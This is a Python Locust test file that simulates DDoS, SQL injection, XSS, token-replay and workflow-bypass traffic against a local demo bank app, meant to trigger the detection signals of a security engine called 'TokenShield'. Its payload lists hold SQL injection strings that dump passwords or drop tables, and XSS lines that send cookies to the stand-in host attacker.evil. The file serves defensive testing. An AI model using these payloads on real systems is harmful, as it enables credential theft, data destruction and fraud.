"""
TokenShield — Locust Demo File (Web GUI Edition)
=================================================
Designed for the Locust Web UI at http://localhost:8089

Covers ALL 8 SIGNALS through two user classes:
  - LegitimateUser  : Normal banking workflow (establishes baseline + S8 trigger)
  - AttackerSwarmer : Volumetric DDoS burst directly into the AI engine (S2)
  - SQLiBot         : SQL injection via search endpoint (S4 + S7)
  - TokenReplayer   : Token replay from Tor/hostile IPs (S1 + S3)
  - WorkflowBypass  : Skips workflow steps, jumps straight to transfer (S8)

HOW TO RUN (Locust Web GUI — NO TERMINAL COMMANDS):
  1. Launch: ./venv/bin/locust -f simulation/locustfile_demo.py --host http://localhost:5001
  2. Open browser: http://localhost:8089
  3. Set users and spawn rate in the Locust GUI
  4. Click START — Locust's own GUI drives the attack

RECOMMENDED DEMO SETTINGS:
  - Phase 1 (baseline): LegitimateUser x3, ramp 1/s
  - Phase 2 (DDoS):     AttackerSwarmer x100, ramp 10/s — fires Signal 2
  - Phase 3 (SQLi):     SQLiBot x5, ramp 2/s — fires Signal 4
  - Phase 4 (Replay):   TokenReplayer x3, ramp 1/s — fires Signals 1+3
"""

import random
import string
import time
import logging
import json

from locust import HttpUser, task, between, constant_pacing, events

log = logging.getLogger("locust.tokenshield_demo")


# ─── Helpers ─────────────────────────────────────────────────────────────────

def random_suffix(n=6):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


TOR_IPS = [
    "185.220.101.23", "185.220.101.47", "185.220.101.88",
    "185.220.100.240", "185.107.80.12", "45.142.212.109",
    "198.51.100.77", "198.51.100.142",
]

HOSTILE_IPS = [
    "178.154.220.18", "92.118.39.44", "80.82.77.139",
    "197.210.54.202", "203.0.113.98",
]

SQLI_PAYLOADS = [
    "1001' UNION SELECT username, password FROM users--",
    "' OR '1'='1' --",
    "1001'; DROP TABLE transactions; --",
    "admin'--",
    "'; SELECT * FROM accounts WHERE '1'='1",
    "' OR 1=1; INSERT INTO transfers VALUES(9999,'OFFSHORE');--",
]

XSS_PAYLOADS = [
    "<script>document.location='http://attacker.evil/steal?c='+document.cookie</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "javascript:fetch('http://attacker.evil/exfil?data='+document.cookie)",
]


# ─── User Class 1: Legitimate Banking User ───────────────────────────────────

class LegitimateUser(HttpUser):
    """
    Simulates a real NeoVault customer.
    - Registers + logs in on spawn
    - Follows the normal banking workflow: dashboard → accounts → transactions → transfer
    - Human-paced (3–10s between tasks)
    - Establishes the session baseline for Signal 8 detection
    """
    wait_time = between(3, 10)

    token = None
    accounts = []
    username = None

    def on_start(self):
        suffix = random_suffix()
        self.username = f"user_{suffix}"
        email = f"{self.username}@sim.local"
        password = "Sim@12345"

        # Register (ignore 409 conflict)
        self.client.post("/api/auth/register", json={
            "username": self.username,
            "email": email,
            "password": password,
        }, name="[Legit] Register", catch_response=True)

        # Login
        r = self.client.post("/api/auth/login", json={
            "username": self.username,
            "password": password,
        }, name="[Legit] Login")

        if r.status_code == 200:
            data = r.json()
            if data.get("success"):
                self.token = data.get("token")
                self._load_accounts()
                log.info("Legitimate user %s logged in OK", self.username)

    def _load_accounts(self):
        if not self.token:
            return
        r = self.client.get("/api/banking/accounts",
                            headers=self._auth(), name="[Legit] Load Accounts")
        if r.status_code == 200:
            self.accounts = r.json().get("accounts", [])

    def _auth(self):
        return {"Authorization": f"Bearer {self.token}"}

    @task(6)
    def view_dashboard(self):
        if not self.token:
            return
        self.client.get("/api/dashboard/stats",
                        headers=self._auth(), name="[Legit] Dashboard Stats")

    @task(5)
    def view_accounts(self):
        if not self.token:
            return
        r = self.client.get("/api/banking/accounts",
                            headers=self._auth(), name="[Legit] View Accounts")
        if r.status_code == 200:
            self.accounts = r.json().get("accounts", [])

    @task(4)
    def view_transactions(self):
        if not self.token:
            return
        self.client.get("/api/banking/transactions?limit=10",
                        headers=self._auth(), name="[Legit] View Transactions")

    @task(2)
    def make_transfer(self):
        if not self.token or len(self.accounts) < 2:
            return
        src, dst = random.sample(self.accounts[:2], 2)
        amount = round(random.uniform(10, 150), 2)
        self.client.post("/api/banking/transfer", json={
            "from_account": src["account_number"],
            "to_account": dst["account_number"],
            "amount": amount,
            "description": "Regular transfer",
        }, headers=self._auth(), name="[Legit] Transfer")

    @task(2)
    def view_activity(self):
        if not self.token:
            return
        self.client.get("/api/dashboard/recent-activity?limit=5",
                        headers=self._auth(), name="[Legit] Recent Activity")

    @task(1)
    def view_cards(self):
        if not self.token:
            return
        self.client.get("/api/banking/cards",
                        headers=self._auth(), name="[Legit] View Cards")


# ─── User Class 2: DDoS Attacker Swarmer ─────────────────────────────────────

class AttackerSwarmer(HttpUser):
    """
    SIGNAL 2 — Request Velocity Attack
    Fires requests at maximum speed directly at the TokenShield engine.
    50+ concurrent users each hitting 200+ RPM will overwhelm the velocity
    threshold and trigger S2 scoring → threat detected → block enacted.
    """
    # Constant pacing: 1 req/s per user. With 50 users = 50 RPS = 3000 RPM
    wait_time = constant_pacing(0.5)

    ATTACKER_IPS = TOR_IPS + HOSTILE_IPS

    @task
    def flood_engine(self):
        """Rapid-fire requests directly into the AI engine analyze endpoint."""
        ip = random.choice(self.ATTACKER_IPS)
        session_id = f"ddos_locust_{random.randint(1, 9999)}"
        self.client.post("/api/v1/analyze", json={
            "session_id": session_id,
            "ip": ip,
            "path": "/api/banking/transfer",
            "method": "POST",
            "user_agent": "DDoSBot/2.0 (flood)",
        }, headers={"Content-Type": "application/json"},
           name="[DDoS] Engine Flood (S2 Signal)",
           catch_response=True)


# ─── User Class 3: SQL Injection Bot ─────────────────────────────────────────

class SQLiBot(HttpUser):
    """
    SIGNAL 4 — Payload Analysis Attack
    Fires SQL injection and XSS payloads against the banking search endpoint.
    TokenShield intercepts and scores the malicious payload patterns.
    """
    wait_time = between(0.5, 2)

    @task(5)
    def inject_via_search(self):
        """SQL injection via NeoVault's /api/banking/search endpoint."""
        payload = random.choice(SQLI_PAYLOADS)
        self.client.post("/api/banking/search", json={
            "query": payload
        }, headers={"Content-Type": "application/json"},
           name="[SQLi] Banking Search Injection (S4 Signal)",
           catch_response=True)

    @task(3)
    def inject_via_engine(self):
        """SQLi payload sent directly through engine analyze for guaranteed S4 scoring."""
        payload = random.choice(SQLI_PAYLOADS + XSS_PAYLOADS)
        ip = random.choice(TOR_IPS)
        self.client.post("/api/v1/analyze", json={
            "session_id": f"sqli_locust_{int(time.time()*1000)}",
            "ip": ip,
            "path": "/api/banking/search",
            "method": "POST",
            "payload": payload,
        }, headers={"Content-Type": "application/json"},
           name="[SQLi] Engine Analyze (S4 Signal)",
           catch_response=True)

    @task(2)
    def xss_injection(self):
        """XSS payload injection — also caught by S4 payload analysis."""
        payload = random.choice(XSS_PAYLOADS)
        ip = random.choice(HOSTILE_IPS)
        self.client.post("/api/v1/analyze", json={
            "session_id": f"xss_locust_{int(time.time()*1000)}",
            "ip": ip,
            "path": "/api/banking/profile",
            "method": "POST",
            "payload": payload,
        }, headers={"Content-Type": "application/json"},
           name="[XSS] Engine Analyze (S4 Signal)",
           catch_response=True)


# ─── User Class 4: Token Replayer ─────────────────────────────────────────────

class TokenReplayer(HttpUser):
    """
    SIGNALS 1 + 3 — IP Reputation + Session Consistency
    Steals a legitimate token from NeoVault, then replays it from
    known Tor exit node IPs. Engine detects the IP reputation (S1)
    and the sudden IP change for the same session (S3).
    """
    wait_time = between(1, 3)

    stolen_token = None
    legitimate_session_id = None

    def on_start(self):
        """Obtain a real token via normal login before attacking."""
        r = self.client.post("/api/auth/login", json={
            "username": "demo",
            "password": "demo123",
        }, name="[Replay] Steal Token via Login")
        if r.status_code == 200:
            data = r.json()
            if data.get("success"):
                self.stolen_token = data.get("token")
                self.legitimate_session_id = f"replay_sess_{int(time.time()*1000)}"
                # Register this session with the engine from a legitimate Mumbai IP
                self.client.post("/api/v1/analyze", json={
                    "session_id": self.legitimate_session_id,
                    "ip": "103.21.58.1",  # Mumbai — legitimate origin
                    "path": "/api/dashboard/stats",
                    "method": "GET",
                }, name="[Replay] Register Legit Session Origin")

    @task(4)
    def replay_from_tor(self):
        """Replay token from Tor exit node — triggers S1 + S3."""
        if not self.stolen_token:
            return
        ip = random.choice(TOR_IPS)
        self.client.post("/api/v1/analyze", json={
            "session_id": self.legitimate_session_id or f"replay_{int(time.time()*1000)}",
            "ip": ip,
            "path": "/api/banking/transfer",
            "method": "POST",
            "user_agent": "curl/7.64 (attacker)",
            "payload": {
                "from_account": "ACC001",
                "to_account": "OFFSHORE-SHELL-777",
                "amount": 99999,
            },
        }, headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {self.stolen_token}",
        }, name="[Replay] Tor Exit Node Replay (S1+S3 Signal)",
           catch_response=True)

    @task(2)
    def replay_from_hostile_asn(self):
        """Replay from hostile Russian/Nigerian ASN — triggers S1."""
        if not self.stolen_token:
            return
        ip = random.choice(HOSTILE_IPS)
        self.client.post("/api/v1/analyze", json={
            "session_id": f"hostile_replay_{int(time.time()*1000)}",
            "ip": ip,
            "path": "/api/banking/accounts",
            "method": "GET",
            "user_agent": "ThreatActor/1.0 (reconnaissance)",
        }, headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {self.stolen_token}",
        }, name="[Replay] Hostile ASN (S1 Signal)",
           catch_response=True)


# ─── User Class 5: Workflow Bypass Attacker ───────────────────────────────────

class WorkflowBypass(HttpUser):
    """
    SIGNAL 8 — Sequential Behavior Anomaly
    Skips the normal authenticated workflow and jumps directly to
    high-value transfer endpoints — indicating automated script behavior.
    A legitimate user always visits dashboard → accounts → then transfer.
    This attacker goes directly: login → TRANSFER (no intermediate steps).
    """
    wait_time = between(0.2, 0.8)

    @task
    def bypass_workflow_to_transfer(self):
        """Direct jump to transfer endpoint, bypassing all normal navigation steps."""
        ip = random.choice(HOSTILE_IPS + TOR_IPS)
        self.client.post("/api/v1/analyze", json={
            "session_id": f"bypass_{int(time.time()*1000)}_{random.randint(0, 9999)}",
            "ip": ip,
            "path": "/api/banking/transfer",
            "method": "POST",
            "user_agent": "python-requests/2.31.0 (automated)",
            "payload": {
                "from_account": "ACC001",
                "to_account": f"OFFSHORE-{random_suffix(8).upper()}",
                "amount": random.choice([5000, 15000, 50000, 99999]),
                "description": "Wire transfer — urgent",
            },
        }, headers={"Content-Type": "application/json"},
           name="[Bypass] Direct Transfer Jump (S8 Signal)",
           catch_response=True)


# ─── Event Hooks ─────────────────────────────────────────────────────────────

@events.test_start.add_listener
def on_test_start(environment, **kwargs):
    log.info("=" * 60)
    log.info("TokenShield Demo — Locust Test Started")
    log.info("=" * 60)
    log.info("War Room Dashboard: http://localhost:7777")
    log.info("NeoVault Bank App:  http://localhost:5001")
    log.info("Locust Web GUI:     http://localhost:8089")
    log.info("=" * 60)
    log.info("User Classes Available:")
    log.info("  LegitimateUser  — Normal banking (S8 baseline)")
    log.info("  AttackerSwarmer — DDoS flood (S2 velocity)")
    log.info("  SQLiBot         — SQL injection (S4 payload)")
    log.info("  TokenReplayer   — Token replay from Tor (S1+S3)")
    log.info("  WorkflowBypass  — Skip workflow to transfer (S8)")


@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    log.info("TokenShield Demo — Locust Test Stopped")
    log.info("Check War Room dashboard for attack telemetry.")
